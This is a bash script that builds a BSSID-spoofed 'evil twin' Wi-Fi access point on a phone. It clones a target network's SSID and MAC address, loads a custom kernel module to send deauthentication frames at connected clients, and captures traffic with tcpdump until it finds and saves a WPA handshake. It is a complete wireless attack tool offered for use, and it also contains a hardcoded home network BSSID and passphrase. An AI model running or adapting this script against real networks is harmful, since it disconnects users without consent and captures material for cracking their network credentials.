#!/bin/bash
# evil_twin2.sh - BSSID-spoofed evil twin AP
# Runs on PHONE
# Strategy: Create AP with SAME BSSID as target → deauth clients → they reconnect to US
# No STA needed for deauth (AP's own PE session has the right BSSID)
#
# Args: TARGET_BSSID TARGET_SSID FREQ CHANNEL [ROUNDS] [WAIT_SEC]
set -o pipefail

TARGET_BSSID="$1"
TARGET_SSID="$2"
FREQ="$3"
CHANNEL="$4"
ROUNDS="${5:-10}"
WAIT_SEC="${6:-30}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:1F"
HOME_PSK="9006609b29404a"
FAKE_PSK="EvilTwinDummyKey12345678"
BSSID_LOWER=$(echo "$TARGET_BSSID" | tr 'A-F' 'a-f')

echo ""
echo "============================================"
echo " BSSID-Spoofed Evil Twin"
echo " Target: $TARGET_SSID ($TARGET_BSSID)"
echo " Freq: ${FREQ}MHz  Ch: $CHANNEL"
echo " Rounds: $ROUNDS  Wait: ${WAIT_SEC}s"
echo "============================================"
echo ""

if [ "$FREQ" -ge 5000 ]; then HW_MODE="a"; else HW_MODE="g"; fi

wait_iface() {
    for i in $(seq 1 100); do
        [ -e "/sys/class/net/$1" ] && return 0
        sleep 0.05
    done
    return 1
}

cleanup() {
    echo "[*] Cleaning up..."
    killall hostapd wpa_supplicant tcpdump 2>/dev/null
    ip link set ap0 down 2>/dev/null
    iw dev ap0 del 2>/dev/null
    # Ensure wlan0 exists for NetworkManager
    if [ ! -e /sys/class/net/wlan0 ]; then
        rmmod wlan 2>/dev/null; sleep 2
        insmod "$DRIVER" 2>/dev/null
    fi
    wait_iface wlan0 && sleep 3
    systemctl start NetworkManager 2>/dev/null; sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] WiFi restored."
}
trap cleanup EXIT

# ===== 1. Load driver =====
echo "[1] Loading driver..."
systemctl stop NetworkManager 2>/dev/null
killall wpa_supplicant hostapd tcpdump 2>/dev/null; sleep 0.5
rmmod wlan 2>/dev/null; sleep 1
insmod "$DRIVER"
wait_iface wlan0 || { echo "[!] wlan0 not found"; exit 1; }
sleep 2

# ===== 2. Create AP interface with spoofed BSSID =====
echo "[2] Creating AP with spoofed BSSID..."
PHY=$(iw dev wlan0 info 2>/dev/null | grep wiphy | awk '{print $2}')
iw phy "phy$PHY" interface add ap0 type __ap 2>&1
wait_iface ap0 || { echo "[!] ap0 creation failed"; exit 1; }

# Set MAC before bringing up
ip link set ap0 down 2>/dev/null
ip link set ap0 address "$TARGET_BSSID" 2>&1
RET=$?
NEW_MAC=$(cat /sys/class/net/ap0/address 2>/dev/null)
echo "  MAC set: exit=$RET, ap0 addr=$NEW_MAC"

if [ "$NEW_MAC" != "$BSSID_LOWER" ]; then
    echo "  [!] MAC spoof failed, trying macchanger..."
    which macchanger >/dev/null 2>&1 && macchanger -m "$TARGET_BSSID" ap0 2>&1
    NEW_MAC=$(cat /sys/class/net/ap0/address 2>/dev/null)
    echo "  ap0 addr=$NEW_MAC"
fi

# Delete wlan0 to free management frame registration for hostapd
echo "  Removing wlan0 (freeing mgmt frame registration)..."
iw dev wlan0 del 2>&1
echo "  wlan0 deleted"

# ===== 3. Start hostapd =====
echo "[3] Starting hostapd..."
cat > /tmp/hostapd_evil2.conf << HAPEOF
interface=ap0
driver=nl80211
ssid=$TARGET_SSID
hw_mode=$HW_MODE
channel=$CHANNEL
bssid=$TARGET_BSSID
wpa=2
wpa_passphrase=$FAKE_PSK
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wmm_enabled=0
ignore_broadcast_ssid=0
HAPEOF

hostapd -dd -f /tmp/hostapd_evil2.log /tmp/hostapd_evil2.conf -B 2>&1
sleep 2

if ! pgrep -f hostapd >/dev/null; then
    echo "  [!] hostapd not running, check log:"
    tail -10 /tmp/hostapd_evil2.log
    exit 1
fi

echo "  hostapd running!"
iw dev ap0 info 2>/dev/null | head -10
echo ""

# Check txpower
AP_TXPWR=$(iw dev ap0 info 2>/dev/null | grep txpower | awk '{print $2}')
echo "  ap0 txpower: $AP_TXPWR dBm"

# Try to set txpower
if [ "$AP_TXPWR" = "0.00" ]; then
    iw dev ap0 set txpower fixed 2000 2>/dev/null
    AP_TXPWR=$(iw dev ap0 info 2>/dev/null | grep txpower | awk '{print $2}')
    echo "  after set: $AP_TXPWR dBm"
fi

# ===== 4. Start capture on ap0 =====
echo "[4] Starting capture on ap0..."
PCAP="/tmp/evil2_${BSSID_LOWER//:/}.pcap"
rm -f "$PCAP"
tcpdump -i ap0 -w "$PCAP" 2>/dev/null &
TCPID=$!

# ===== 5. Deauth + wait loop =====
HANDSHAKE_FOUND=0
for round in $(seq 1 "$ROUNDS"); do
    echo ""
    echo "========== ROUND $round/$ROUNDS =========="

    # Fire deauths through AP's PE session (BSSID match)
    DEAUTH_OK=0
    echo -n "  [*] Deauths: "
    for f in $(seq 1 5); do
        dmesg -C
        insmod /tmp/petx11.ko 2>/dev/null
        if dmesg | grep -q "Deauth TX"; then
            DEAUTH_OK=$((DEAUTH_OK + 1)); echo -n "+"
        else
            echo -n "x"
        fi
        sleep 0.2
    done
    echo " ($DEAUTH_OK/5)"

    if [ "$DEAUTH_OK" -gt 0 ]; then
        echo "  [*] Waiting ${WAIT_SEC}s for reconnections..."
    else
        echo "  [-] No deauths, PE session check..."
        dmesg | grep -i "petx11\|pe_find\|kfind" | tail -5
    fi

    sleep "$WAIT_SEC"

    # Check hostapd log for client connections
    if grep -qi "STA.*associated\|RADIUS.*Access-Request\|WPA.*PTKSTART\|started (sta=" /tmp/hostapd_evil2.log 2>/dev/null; then
        echo "  [!!!] Client activity in hostapd log!"
        grep -i "STA\|EAPOL\|WPA\|started.*sta=" /tmp/hostapd_evil2.log | tail -10
    fi

    # Check pcap for EAPOL
    if [ -f "$PCAP" ] && [ "$(stat -c%s "$PCAP" 2>/dev/null)" -gt 24 ]; then
        ECOUNT=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        ECOUNT=$(echo "$ECOUNT" | tr -d '[:space:]')
        [ -z "$ECOUNT" ] && ECOUNT=0
        FSIZE=$(stat -c%s "$PCAP" 2>/dev/null)
        echo "  [*] Capture: ${FSIZE}B, EAPOL: $ECOUNT"

        if [ "$ECOUNT" -gt 0 ]; then
            echo "  [!!!] EAPOL DETECTED!"
            HANDSHAKE_FOUND=1
            cp "$PCAP" "/tmp/handshake_evil2_${BSSID_LOWER//:/}.pcap"
            break
        fi
    fi
done

kill $TCPID 2>/dev/null; wait $TCPID 2>/dev/null

echo ""
echo "============================================"
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo " SUCCESS!"
else
    echo " No handshake in $ROUNDS rounds"
    echo " hostapd log (last 20 lines):"
    tail -20 /tmp/hostapd_evil2.log 2>/dev/null
fi
echo "============================================"
exit $((1 - HANDSHAKE_FOUND))
